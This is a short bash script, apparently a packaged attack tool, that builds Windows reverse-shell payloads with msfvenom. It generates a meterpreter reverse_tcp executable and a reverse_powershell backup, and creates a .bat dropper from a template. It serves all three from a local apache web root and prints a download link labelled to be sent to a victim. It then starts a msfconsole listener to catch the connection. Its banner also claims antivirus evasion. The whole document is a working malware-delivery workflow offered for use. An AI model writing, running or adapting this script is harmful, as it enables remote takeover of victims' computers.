#!/bin/bash

cat logo.txt
echo "| windows anti anit-virus PAYLOAD - CPScript |"
sleep 2

echo "Enter Port [Example: 4444]:"
read port

echo " Enter the Lhost:"
read lhost

echo "Enter the Payload Name:"
read name

echo "                                                                  WAIT PAYlOAD IS RUNNING" 
msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhost lport=$port -f exe > $name.exe

echo ""
echo " Enter the Backup Payload Name:"
read backup
msfvenom -p cmd/windows/reverse_powershell lhost=$lhost lport=$port > $backup.sh
systemctl start apache2
systemctl restart apache2.service
mv /var/www/html/index.html /var/www/
mv $name.exe /var/www/html/
mv $backup.sh /var/www/html/
echo ""
echo " Enter One More Diffrent Payload Name"
read payload
sed -e "s/\$ip/$lhost/" -e "s/\$name/$name/" -e "s/\$lhost/$lhost/" -e "s/\$backup/$backup/" requirements.txt > $payload.bat
sudo mv $payload.bat /var/www/html/
echo ""
echo "                                                        payload link(send to victim): http://$lhost/$payload.bat"
 
sed -e "s/\$lhost/$lhost/" meterpreter.rc > $name.rc
msfconsole -r $name.rc
